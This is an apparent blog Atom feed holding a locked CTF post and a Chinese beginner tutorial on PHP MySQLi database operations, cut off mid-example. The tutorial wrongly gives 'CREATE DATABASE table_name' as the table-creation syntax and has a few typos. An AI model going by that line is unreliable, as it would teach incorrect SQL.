  
  <entry>
    <title>线下AWD攻防赛总结</title>
    <link href="http://atkx.top/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://atkx.top/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/</id>
    <published>2021-01-16T04:03:43.000Z</published>
    <updated>2021-08-15T03:59:06.614Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码不正确。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="17aa38b7ea6e4d513fb72d55b308c11c784c9257aaf561f756df4fbb5405c577"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇受密码保护的文章，您需要提供访问密码：</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="AWD" scheme="http://atkx.top/categories/CTF/AWD/"/>
    
    
    <category term="AWD" scheme="http://atkx.top/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>PHP 数据库操作</title>
    <link href="http://atkx.top/2020/12/15/PHP%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/"/>
    <id>http://atkx.top/2020/12/15/PHP%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</id>
    <published>2020-12-15T05:36:10.000Z</published>
    <updated>2021-08-15T03:59:06.475Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>菜鸟驿站PHP学习笔记</p></blockquote><h2 id="PHP连接MySQL"><a href="#PHP连接MySQL" class="headerlink" title="PHP连接MySQL"></a>PHP连接MySQL</h2><p>PHP连接数据库主要用到mysqli_connect()函数</p><p>函数语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mysqli_connect(host,username,password,dbname,port,socket);<br></code></pre></td></tr></table></figure><p>参数说明：<br>| 参数     | 描述                                        |<br>| ——– | ——————————————- |<br>| host     | 可选。规定主机名或 IP 地址。                |<br>| username | 可选。规定 MySQL 用户名。                   |<br>| password | 可选。规定 MySQL 密码。                     |<br>| dbname   | 可选。规定默认使用的数据库。                |<br>| port     | 可选。规定尝试连接到 MySQL 服务器的端口号。 |<br>| socket   | 可选。规定 socket 或要使用的已命名 pipe。   |</p><p>首先通过 phpinfo() 查看是否安装成功<br><img src="https://img-blog.csdnimg.cn/20210414170628923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>下面MySQLi面向对象和面向过程的思想连接数据库</p><h3 id="创建连接"><a href="#创建连接" class="headerlink" title="创建连接"></a>创建连接</h3><p>实例1：<strong>MySQLi - 面向对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;password&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br> <br><span class="hljs-comment">// 检测连接</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span> . <span class="hljs-variable">$conn</span>-&gt;connect_error);<br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;连接成功&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong>：在以上面向对象的实例中 <code>$connect_erro</code>r 是在 PHP 5.2.9 和 5.3.0 中添加的。如果你需要兼容更早版本 请使用以下代码替换:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 检测连接</span><br><span class="hljs-keyword">if</span> (mysqli_connect_error()) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;数据库连接失败: &quot;</span> . mysqli_connect_error());<br>&#125;<br></code></pre></td></tr></table></figure><p>实例2：<strong>MySQLi - 面向过程</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;password&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br> <br><span class="hljs-comment">// 检测连接</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;连接成功&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong>：默认端口号为3306，如果端口号修改，可以为数据库参数添加空字符串，如: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>,<span class="hljs-string">&quot;&quot;</span>,port);<br></code></pre></td></tr></table></figure><h3 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h3><p>连接在脚本执行完后会自动关闭。你也可以使用以下代码来关闭连接：</p><p>实例 (MySQLi - 面向对象)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span>-&gt;close();<br></code></pre></td></tr></table></figure><p>实例 (MySQLi - 面向过程)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mysqli_close(<span class="hljs-variable">$conn</span>);<br></code></pre></td></tr></table></figure><p><strong>数据库连接编码问题</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//php5</span><br>mysql_query(<span class="hljs-string">&quot;set character set &#x27;utf8&#x27;&quot;</span>);<span class="hljs-comment">//读库 </span><br>mysql_query(<span class="hljs-string">&quot;set names &#x27;utf8&#x27;&quot;</span>);<span class="hljs-comment">//写库</span><br><br><span class="hljs-comment">//php7</span><br>mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;set character set &#x27;utf8&#x27;&quot;</span>);<span class="hljs-comment">//读库 </span><br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set names &#x27;utf8&#x27;&quot;</span>);<span class="hljs-comment">//写库</span><br></code></pre></td></tr></table></figure><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>创建 MySQL数据库语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">CREATE DATABASE database_name;<br></code></pre></td></tr></table></figure><p>创建一个数据库demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL 创建数据库</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-comment">// 检测连接</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span> . mysqli_connect_error());<br>&#125;<br> <br><span class="hljs-comment">// 创建数据库</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;CREATE DATABASE demo&quot;</span>;<br><span class="hljs-keyword">if</span> (mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据库创建成功&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error creating database: &quot;</span> . mysqli_error(<span class="hljs-variable">$conn</span>);<br>&#125;<br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>数据库创建成功<br><img src="https://img-blog.csdnimg.cn/20210414182704415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><p>创建 MySQL 数据表语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">CREATE DATABASE table_name;<br></code></pre></td></tr></table></figure><p>创建数据表MyDemo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL 创建数据表MyDemo</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// 检测连接</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span> . mysqli_connect_error());<br>&#125;<br> <br><span class="hljs-comment">// 使用 sql 创建数据表</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;CREATE TABLE MyDemo (</span><br><span class="hljs-string">id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span><br><span class="hljs-string">name VARCHAR(30) NOT NULL,</span><br><span class="hljs-string">sex VARCHAR(30) NOT NULL,</span><br><span class="hljs-string">age INT(3)</span><br><span class="hljs-string">)&quot;</span>;<br> <br><span class="hljs-keyword">if</span> (mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据表MyDemo创建成功&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;创建数据表错误: &quot;</span> . mysqli_error(<span class="hljs-variable">$conn</span>);<br>&#125;<br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>创建成功<br><img src="https://img-blog.csdnimg.cn/20210414184817372.png" alt="在这里插入图片描述"></p><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><p>INSERT INTO 语句通常用于向 MySQL 表添加新的记录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">INSERT INTO table_name (column1, column2, column3,...)<br>VALUES (value1, value2, value3,...)<br></code></pre></td></tr></table></figure><p>往表里插入一条数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">INSERT INTO mydemo (id, name, sex ,age)<br>VALUES (<span class="hljs-number">1001</span>, <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;男&#x27;</span>,<span class="hljs-number">18</span>)<br></code></pre></td></tr></table></figure><p>代码实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL 插入数据</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// 检测连接</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());<br>&#125;<br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set names utf8&quot;</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO mydemo (id, name, sex ,age)</span><br><span class="hljs-string">VALUES (1001, &#x27;张三&#x27;, &#x27;男&#x27;,18)&quot;</span>;<br> <br><span class="hljs-keyword">if</span> (mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;新记录插入成功&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="hljs-variable">$conn</span>);<br>&#125;<br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>插入数据成功<br><img src="https://img-blog.csdnimg.cn/20210415125056358.png" alt="在这里插入图片描述"><br>插入多条数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO mydemo (id, name, sex ,age)</span><br><span class="hljs-string">VALUES (1002, &#x27;李四&#x27;, &#x27;女&#x27;,19);&quot;</span>;<br><span class="hljs-variable">$sql</span> .= <span class="hljs-string">&quot;INSERT INTO mydemo (id, name, sex ,age)</span><br><span class="hljs-string">VALUES (1003, &#x27;王五&#x27;, &#x27;男&#x27;,20);&quot;</span>;<br><span class="hljs-variable">$sql</span> .= <span class="hljs-string">&quot;INSERT INTO mydemo (id, name, sex ,age)</span><br><span class="hljs-string">VALUES (1004, &#x27;刘六&#x27;, &#x27;男&#x27;,21);&quot;</span>;<br><br><span class="hljs-comment">#注意此处改为mysqli_multi_query函数，执行多个针对数据库的查询 </span><br><span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;新记录插入成功&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="hljs-variable">$conn</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>表中新增3条数据<br><img src="https://img-blog.csdnimg.cn/20210415130249849.png" alt="在这里插入图片描述"></p><h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><p>SELECT 语句用于从数据表中读取数据:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT column_name(s) <span class="hljs-keyword">FROM</span> table_name<br></code></pre></td></tr></table></figure><p>我们可以使用 * 号来读取所有数据表中的字段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT * <span class="hljs-keyword">FROM</span> table_name<br></code></pre></td></tr></table></figure><p>在test数据库中student表的内容：<br><img src="https://img-blog.csdnimg.cn/202104141743230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从student表中读取数据:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL 读取mydemo表数据</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-comment">//设置返回数据的字符集</span><br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set character set &#x27;utf8&#x27;&quot;</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM mydemo&quot;</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br><br><span class="hljs-keyword">if</span> (mysqli_num_rows(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// 输出数据</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_assoc(<span class="hljs-variable">$result</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ID: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>]. <span class="hljs-string">&quot; - 姓名: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;name&quot;</span>]. <span class="hljs-string">&quot; - 性别: &quot;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;sex&quot;</span>].<span class="hljs-string">&quot;-年龄: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;age&quot;</span>]. <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;0 结果&quot;</span>;<br>&#125;<br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>读到了表中的数据<br><img src="https://img-blog.csdnimg.cn/20210415130519716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>读出来的数据不够美观，参照<a href="https://blog.csdn.net/weixin_43627723/article/details/102503726">大佬</a>的博客美化一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL 读取mydemo表数据</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-comment">//设置返回数据的字符集</span><br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set names utf8&quot;</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM mydemo&quot;</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br><br><br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCYTPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset = <span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;title&gt;&lt;/title&gt;<br>&lt;style type=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>th,td&#123;<br>padding:<span class="hljs-number">5</span>px;color:<span class="hljs-comment">#444;</span><br>font-size:<span class="hljs-number">14</span>px;border:<span class="hljs-number">1</span>px soild <span class="hljs-comment">#ccc;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;table width=<span class="hljs-string">&quot;800&quot;</span> border=<span class="hljs-string">&quot;1&quot;</span> style=<span class="hljs-string">&quot;border-collapse:collapse;&quot;</span> align=<span class="hljs-string">&quot;center&quot;</span>&gt;<br>&lt;tr&gt;<br>&lt;th&gt;ID&lt;/th&gt;<br>&lt;th&gt;姓名&lt;/th&gt;<br>&lt;th&gt;性别&lt;/th&gt;<br>&lt;th&gt;年龄&lt;/th&gt;<br>&lt;/tr&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_row(<span 